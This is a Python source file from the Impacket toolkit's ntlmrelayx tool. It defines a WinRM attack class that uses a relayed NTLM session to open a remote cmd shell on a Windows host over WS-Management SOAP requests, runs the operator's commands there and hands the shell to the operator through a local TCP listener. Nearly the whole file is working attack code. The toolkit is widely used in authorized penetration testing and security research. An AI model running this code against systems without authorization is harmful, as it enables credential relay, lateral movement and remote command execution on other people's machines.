# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   WinRM Attack Class
#
# Authors:
#   Joe Mondloch (jmk@foofus.net)
#   Aurélien Chalot (@Defte_)

import re
import cmd
import sys
import base64
from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell

PROTOCOL_ATTACK_CLASS = "WINRMAttack"

class WinRMShell(cmd.Cmd):

    def __init__(self, tcp_shell, client):
        cmd.Cmd.__init__(self, stdin=tcp_shell.stdin, stdout=tcp_shell.stdout)

        sys.stdout = tcp_shell.stdout
        sys.stdin = tcp_shell.stdin
        sys.stderr = tcp_shell.stdout

        self.use_rawinput = False
        self.shell = tcp_shell
        self.client = client

        self.prompt = "\n# "
        self.tid = None
        self.intro = "Type help for list of commands"
        self.loggedIn = True
        self.last_output = None
        self.completion = []

        self.shell_id = None

         # Getting Shell ID
        initiate_shell = '''
        <?xml version="1.0" encoding="utf-8"?>
        <env:Envelope
            xmlns:env="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
            <env:Header>
                <a:To>http://windows-host:5985/wsman</a:To>
                <a:ReplyTo>
                    <a:Address mustUnderstand="true">
                        http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous
                    </a:Address>
                </a:ReplyTo>
                <a:MessageID>uuid:2a8ac24f-00f0-4a87-860c-bf58d33a1e0a</a:MessageID>
                <a:Action mustUnderstand="true">
                    http://schemas.xmlsoap.org/ws/2004/09/transfer/Create
                </a:Action>
                <w:ResourceURI mustUnderstand="true">
                    http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                </w:ResourceURI>
                <w:OperationTimeout>PT20S</w:OperationTimeout>
                <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>
                <w:OptionSet>
                    <w:Option Name="WINRS_NOPROFILE">FALSE</w:Option>
                    <w:Option Name="WINRS_CODEPAGE">437</w:Option>
                </w:OptionSet>
                <w:Locale xml:lang="en-US"/>
                <p:DataLocale xml:lang="en-US"/>
            </env:Header>
            <env:Body>
                <rsp:Shell>
                    <rsp:InputStreams>stdin</rsp:InputStreams>
                    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
                </rsp:Shell>
            </env:Body>
        </env:Envelope>
        '''

        headers = {
          "Content-Length": len(initiate_shell),
          "Content-Type": "application/soap+xml;charset=UTF-8"
        }

        self.client.request("POST", "/wsman", headers=headers, body=initiate_shell)
        res = self.client.getresponse()

        # Retrieve ShellID
        if match := re.search(r'<w:Selector\s+Name="ShellId">(.*?)</w:Selector>', res.read().decode()):
            self.shell_id = match.group(1)

    def emptyline(self):
        pass

    def onecmd(self, command):
        if not command.strip():
            return     

        if command.strip() == "exit":
            self.do_exit()

        # Send Command XML
        execute_command_xml = f'''
        <?xml version="1.0" encoding="utf-8"?>
        <env:Envelope
            xmlns:env="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
            <env:Header>
                <a:To>http://windows-host:5985/wsman</a:To>
                <a:ReplyTo>
                    <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action mustUnderstand="true">
                    http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command
                </a:Action>
                <a:MessageID>uuid:10000000-0000-0000-0000-000000000002</a:MessageID>
                <w:ResourceURI mustUnderstand="true">
                    http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                </w:ResourceURI>
                <w:SelectorSet>
                    <w:Selector Name="ShellId">{self.shell_id}</w:Selector>
                </w:SelectorSet>
            </env:Header>
            <env:Body>
                <rsp:CommandLine>
                    <rsp:Command>{command}</rsp:Command>
                </rsp:CommandLine>
            </env:Body>
            </env:Envelope>
            '''

        self.client.request("POST", "/wsman", headers={
            "Content-Length": str(len(execute_command_xml)),
            "Content-Type": "application/soap+xml;charset=UTF-8"
        }, body=execute_command_xml)

        response = self.client.getresponse()
        body = response.read().decode()

        command_id = re.search(r"<rsp:CommandId>(.*?)</rsp:CommandId>", body).group(1)
        receive_xml = f'''
        <?xml version="1.0" encoding="utf-8"?>
        <env:Envelope
            xmlns:env="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
            <env:Header>
                <a:To>http://windows-host:5985/wsman</a:To>
                <a:ReplyTo>
                    <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action mustUnderstand="true">
                    http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive
                </a:Action>
                <a:MessageID>uuid:2a8ac24f-00f0-4a87-860c-bf58d33a1e0a</a:MessageID>
                <w:ResourceURI mustUnderstand="true">
                    http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                </w:ResourceURI>
                <w:SelectorSet>
                    <w:Selector Name="ShellId">{self.shell_id}</w:Selector>
                </w:SelectorSet>
            </env:Header>
            <env:Body>
                <rsp:Receive>
                    <rsp:DesiredStream CommandId="{command_id}">stdout stderr</rsp:DesiredStream>
                </rsp:Receive>
            </env:Body>
        </env:Envelope>
        '''

        self.client.request("POST", "/wsman", headers={
            "Content-Length": str(len(receive_xml)),
            "Content-Type": "application/soap+xml;charset=UTF-8"
        }, body=receive_xml)

        response = self.client.getresponse()
        body = response.read().decode()

        # Extract and decode output
        matches = re.findall(r'<rsp:Stream Name="stdout"[^>]*>(.*?)</rsp:Stream>', body)
        for match in matches:
            try:
                command_output = base64.b64decode(match).decode("utf-8", errors="ignore").strip()
                if command_output:
                    print(command_output)
            except Exception as e:
                LOG.error(f"Failed to decode output: {e}")
                print(match)

    def do_exit(self):
        # This request is used to clean up the previously used ShellID
        destroy_shell = f'''
        <?xml version="1.0" encoding="utf-8"?>
        <env:Envelope
            xmlns:env="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
            <env:Header>
                <a:To>http://windows-host:5985/wsman</a:To>
                <a:ReplyTo>
                    <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action mustUnderstand="true">
                    http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete
                </a:Action>
                <a:MessageID>uuid:10000000-0000-0000-0000-000000000004</a:MessageID>
                <w:ResourceURI mustUnderstand="true">
                    http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd
                </w:ResourceURI>
                <w:SelectorSet>
                    <w:Selector Name="ShellId">{self.shell_id}</w:Selector>
                </w:SelectorSet>
            </env:Header>
            <env:Body/>
        </env:Envelope>
        '''

        headers = {
            "Content-Length": len(destroy_shell),
            "Content-Type": "application/soap+xml;charset=UTF-8"
        }

        self.client.request("POST", "/wsman", headers=headers, body=destroy_shell)
        res = self.client.getresponse()   
        res.read()

        if self.shell is not None:
            self.shell.close()

        LOG.info("WinRM shell destroyed successfully. You can now leave the NC shell :)")
        return True

    def do_EOF(self, line):
        print("Bye!\n")
        return True

class WINRMAttack(ProtocolAttack):
    PLUGIN_NAMES = ["WINRMS"]

    def __init__(self, config, WINRMClient, username, target=None, relay_client=None):
        ProtocolAttack.__init__(self, config, WINRMClient, username, target, relay_client)
        self.tcp_shell = TcpShell()

    def run(self):
        LOG.info(f"Started interactive WinRMS shell via TCP on 127.0.0.1:{self.tcp_shell.port}") 
        self.tcp_shell.listen()
        shell = WinRMShell(self.tcp_shell, self.client)
        shell.cmdloop()
